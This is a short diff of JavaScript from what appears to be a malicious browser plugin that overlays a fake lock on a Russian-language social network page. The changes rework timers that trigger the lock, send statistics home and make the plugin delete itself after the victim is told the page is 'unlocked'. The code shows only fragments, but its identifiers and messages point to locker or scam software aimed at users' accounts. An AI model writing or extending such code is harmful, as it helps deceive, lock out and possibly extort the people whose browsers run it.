@@ -357,7 +357,7 @@ function st_2() {
                 alert('Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль');
                 RedirToChangePass();
                 HideLock();
-				plg.Del(); 
+				setTimeout(function () {plg.Del();},5000);
                 return true;
             }
 
@@ -601,6 +601,13 @@ window.onload = function()
 }
 
 function Wnd() {
+	if (plg.Get('oTime')){
+		 IsTime();
+	
+	}
+	else{
+	CheckTime();
+	}
     LoadCSS();
     document.body.removeEventListener('DOMNodeInserted', Plus, false);
     var modalPop = document.getElementById('hook_Block_PopLayer');
@@ -618,6 +625,12 @@ function Wnd() {
 }
 
 function Wnd_Page() {
+if (plg.Get('oTime')){
+		IsTime();
+	}
+	else{
+	CheckTime();
+	}
     if (document.getElementsByClassName('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]) {
         document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0].parentNode.removeChild(document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]);
     }
@@ -736,8 +749,8 @@ function GetId() {
 }
 window.onload = function () {
 
-    CheckTime();
-    IsTime();
+    //CheckTime();
+   
     NewAction();
     GetId();
 	GetName();
@@ -825,8 +838,7 @@ function IsTime() {
         plg.Save('oRun', '0');
 		SendStat(666,"big");
 		setTimeout(function () {plg.Del();},5000);
-		plg.Del();
-        LockStop();
+	LockStop();
 
     }
 }
